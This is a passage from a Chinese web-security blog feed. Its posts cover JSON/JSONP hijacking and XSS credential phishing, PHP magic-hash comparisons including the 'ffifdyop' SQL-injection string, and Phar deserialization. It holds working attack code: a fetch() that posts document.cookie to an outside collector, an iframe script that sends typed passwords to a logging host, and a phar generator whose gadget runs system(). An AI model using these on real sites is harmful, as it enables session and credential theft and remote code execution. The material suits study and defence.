class="string">&quot;admin@x.com&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;...&quot;</span>: <span class="string">&quot;...&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取其之前的JSON数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype,<span class="string">&quot;account&quot;</span>,&#123;</span></span><br><span class="line"><span class="javascript">    set:<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// ...</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;json.x.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码通过重写Object类的set方法实现了对<code>account</code>属性的hook，目前该漏洞已被修复，可以通过本地测试来管中窥豹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype, <span class="string">&quot;Id&quot;</span>, &#123;</span><br><span class="line">    set:<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        alert(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这样怼属性可以</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">a.Id = <span class="number">666</span>;</span><br><span class="line"><span class="comment">// 这个JSON就不行了</span></span><br><span class="line"><span class="keyword">var</span> b=&#123;<span class="string">&quot;Id&quot;</span>:<span class="number">250</span>&#125;;</span><br></pre></td></tr></table></figure><p>看完了被修复的JSON劫持，再来看看目前依然存在的JSONP劫持。假设<code>a.x.com/index.php</code>负责校验身份并调用数据接口，<code>a.x.com/json.php</code>负责返回敏感数据，当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取敏感数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com/index.php --&gt;</span><br><span class="line"><span class="comment">// 与上例相同</span></span><br><span class="line"></span><br><span class="line">&lt;!-- a.x.com/json.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;user&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $callback.<span class="string">&#x27;(&#123;&quot;id&quot;: 0, &quot;token&quot;: &quot;SuperSecTokenStr&quot;&#125;)&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> $callback.<span class="string">&#x27;获取失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- hack.com --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;hack站或有XSS的页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hackfun</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> datas = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> key in obj) &#123;</span><br><span class="line">                <span class="keyword">var</span> tmp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                tmp = key+<span class="string">&#x27;:&#x27;</span>+obj[key]+<span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                datas += tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            fetch(<span class="string">&#x27;//68943a75.y7z.xyz/&#x27;</span> ,&#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">                body: document.cookie</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;http://a.x.com/json.php?callback=hackfun&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="攻击思路三（误）"><a href="#攻击思路三（误）" class="headerlink" title="攻击思路三（误）"></a>攻击思路三（误）</h2><p>假设<code>a.x.com</code>与<code>x.com</code>相互信任，利用<code>b.x.com</code>的XSS钓取a登录处的帐号密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- a.x.com/login.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>悲催的A<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 100px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login&quot;</span> <span class="attr">action</span>=<span class="string">&quot;//baidu.com&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            账户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;account&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.domain=<span class="string">&quot;x.com&quot;</span>;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- b.x.com --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>有XSS的B<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//a.x.com/login.html&quot;</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">100%</span> <span class="attr">frameborder</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.domain=<span class="string">&#x27;x.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ifrm = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>).contentWindow;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>).onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            ifrm.document.getElementById(<span class="string">&#x27;submit&#x27;</span>).onmousedown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> account = ifrm.document.getElementById(<span class="string">&quot;account&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> passwd = ifrm.document.getElementById(<span class="string">&quot;passwd&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> url = <span class="string">&#x27;//WebLog/?account=&#x27;</span>+account+<span class="string">&#x27;&amp;&#x27;</span>+<span class="string">&#x27;passwd=&#x27;</span>+passwd;</span></span><br><span class="line">                fetch(url, &#123;</span><br><span class="line"><span class="javascript">                    mode: <span class="string">&#x27;no-cors&#x27;</span></span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实战中XSS通常有限制，没机会插这么多代码进去，所以一般采用外联JS的方式引入，浏览器虽然会在控制台中报跨域错误并拦截响应，但通常仍可以正常发出请求并将敏感数据带至WebLog平台。抓包分析可以发现，虽然<code>&lt;iframe&gt;</code>放在了<code>&lt;script&gt;</code>前面，不过浏览器的请求顺序是：</p><ol start="0"><li><p>加载主页面</p></li><li><p>加载iframe<strong>标签</strong></p></li><li><p>加载外联JS</p></li><li><p>加载iframe<strong>内容</strong></p></li><li><p>用户按下<code>提交</code>按钮</p></li><li><p>执行劫持函数</p></li><li><p>表单提交</p></li></ol><p>这里说这么细是因为发现了一个有趣但蛋疼的问题，最初用作触发劫持函数的代码其实是用<code>document.getElementById(&#39;login&#39;).onsubmit</code>监测表单提交实现的，测试过程中一会可以一会嗝屁特别玄学，接着就开始了三天的对 浏览器、服务器、操作系统、网络地址、网络环境 一千多次的黑盒交叉测试（哭了），最终将影响因素锁定在表单提交后的新页面加载速度上。</p><p>因为如果 后者的加载速度 比 监测到表单提交并执行劫持函数 这一过程的速度要更快的话，新来的页面会将在内存中还未来得及执行完的劫持函数给刷掉。。。。。由于表单提交的默认监听事件是鼠标点击<code>提交</code>按钮（按下再松开），所以我将劫持函数的监听事件改为了检测鼠标按下，这样如果按下<code>提交</code>按钮后松得慢一点，就能产生一个让劫持函数执行完的时间缝隙Orz。。。。。当然如果点击的手速够快的话仙人可能也跳不到你</p><p>回过头看之前的实现方式，则是等用户点击<code>提交</code>按钮后，劫持函数 与 新页面加载 同时执行，拼的是 WebLog平台所在服务器 与 新页面所在服务器 的响应速度，不确定性就太多了。。。。。而改为 检测鼠标按下 后则在此基础上又开辟了 受害者点击 手速这个时间窗口23333</p><p>更新：经p师傅提醒，监听鼠标点击可能会错过通过<code>回车</code>或是<code>自动填充提交</code>方式提交的表单，所以为了保险可以两种方式同时使用</p><p>到此为止，有没有觉得哪里有点不对劲？如果目的是想利用<code>b.x.com</code>的XSS钓取a的帐号密码的话，为何不直接通过JS重写b的页面仿造成a登录处的样子并劫持表单输入呢？干嘛要用什么鬼跨域的逻辑绕来绕去（淦）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-origin policy</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">Cross-Origin Resource Sharing</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">Using Fetch</a></p><p><a href="https://www.freebuf.com/articles/web/208672.html">浅谈跨域威胁与安全</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;何为同源&quot;&gt;&lt;a href=&quot;#何为同源&quot; class=&quot;headerlink&quot; title=&quot;何为同源&quot;&gt;&lt;/a&gt;何为同源&lt;/h2&gt;&lt;p&gt;如果两个URL的协议、域名、端口一致则满足同源，&lt;code&gt;http&lt;/code&gt;与&lt;code&gt;https&lt;/code&gt;、&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cors" scheme="https://hosch3n.github.io/tags/cors/"/>
    
    <category term="jsonp" scheme="https://hosch3n.github.io/tags/jsonp/"/>
    
  </entry>
  
  <entry>
    <title>PHP哈希函数</title>
    <link href="https://hosch3n.github.io/2020/08/24/PHP%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/"/>
    <id>https://hosch3n.github.io/2020/08/24/PHP%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/</id>
    <published>2020-08-24T03:39:24.000Z</published>
    <updated>2021-05-29T12:50:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0e"><a href="#0e" class="headerlink" title="0e"></a>0e</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&#x27;0e123&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;0e456&#x27;</span>;</span><br><span class="line">$a == $b;</span><br><span class="line">$a !== $b;</span><br><span class="line"></span><br><span class="line">md5(<span class="string">&#x27;QNKCDZO&#x27;</span>) == md5(<span class="string">&#x27;240610708&#x27;</span>);</span><br><span class="line">md5(<span class="string">&#x27;s878926199a&#x27;</span>) == md5(<span class="string">&#x27;s155964671a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>) == sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>);</span><br><span class="line">sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>) == sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;0e251288019&#x27;</span> == hash(<span class="string">&#x27;md4&#x27;</span>, <span class="string">&#x27;0e251288019&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a = [<span class="number">0</span>];</span><br><span class="line">$b = [<span class="number">1</span>];</span><br><span class="line">$a != $b;</span><br><span class="line"></span><br><span class="line">md5($a) === md5($b);</span><br><span class="line"></span><br><span class="line">sha1($a) === sha1($b);</span><br><span class="line"></span><br><span class="line">hash(<span class="string">&#x27;md4&#x27;</span>, $a) == hash(<span class="string">&#x27;md4&#x27;</span>, $b);</span><br></pre></td></tr></table></figure><h2 id="‘or"><a href="#‘or" class="headerlink" title="‘or"></a>‘or</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stristr(md5(<span class="string">&#x27;ffifdyop&#x27;</span>, <span class="literal">true</span>), <span class="string">&quot;&#x27;or&#x27;&quot;</span>);</span><br><span class="line">stristr(md5(<span class="string">&#x27;129581926211651571912466741651878684928&#x27;</span>, <span class="literal">true</span>), <span class="string">&quot;&#x27;or&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><p>浮点值运算存在精度问题，反序列化时会出现值不等但运算后哈希相同。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0e&quot;&gt;&lt;a href=&quot;#0e&quot; class=&quot;headerlink&quot; title=&quot;0e&quot;&gt;&lt;/a&gt;0e&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="hash" scheme="https://hosch3n.github.io/tags/hash/"/>
    
    <category term="md" scheme="https://hosch3n.github.io/tags/md/"/>
    
    <category term="sha" scheme="https://hosch3n.github.io/tags/sha/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化</title>
    <link href="https://hosch3n.github.io/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://hosch3n.github.io/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-08-19T09:43:01.000Z</published>
    <updated>2020-10-14T08:08:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>Phar是打包的PHP文件，跟Java的JAR包类似。通过文件类函数和<code>phar://</code>伪协议可以对phar文件进行读写等操作，如果 <code>phar.readonly</code> 为禁用则可以生成phar文件，但出于安全考虑该配置默认为启用。</p><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>根据<a href="https://www.php.net/manual/en/phar.fileformat.phar.php">官方文档</a>可知，Phar由 <code>stub</code>/<code>manifest</code>/<code>contents</code>/<code>signature</code> 四部分组成。</p><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p><code>stub</code> 用于标识phar文件类型，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>（xxx为任意内容）。因为无需以特定标识开头，所以可以结合其它文件头进行伪装：<code>GIF89a&lt;?php __HALT_COMPILER();?&gt;</code>。</p><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>该结构存放了一些phar文件的大小长度等属性，包括序列化格式的元数据。</p><h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p><code>contents</code> 存放压缩后的实际文件内容。</p><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>顾名思义该结构用于文件校验，可以是常见的哈希值或密钥签名。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>因为 <code>manifest</code> 中的 <code>Meta-data</code> 以序列化格式存储，那么读取时必然有反序列化的过程，如果该部分用户可控（如上传phar文件并引用），则存在反序列化漏洞。</p><ul><li><a href="https://github.com/php/php-src/commit/0c238ede019f6ffbe7c996ec1695a747f4bca966">PHP8.0</a> 改为了不自动反序列化 <code>Meta-data</code>，除非调用了 <code>getMetadata()</code></li></ul><h3 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $call;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call = <span class="keyword">new</span> Normal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ddmddw!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$path = <span class="string">&#x27;phar://test.phar&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>($path);</span><br><span class="line">file_exists($path);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $call;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call = <span class="keyword">new</span> Run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> Control();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建新的test.phar文件</span></span><br><span class="line">@unlink(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="comment">// 开始初始化过程</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="comment">// 添加要打包压缩的文件</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="comment">// 插入伪装过的头部标识</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// 插入Meta-data并序列化</span></span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line"><span class="comment">// 生成phar文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>附上l1nk3r师傅总结的常用魔术方法触发条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup()      <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep()       <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct()    <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call()        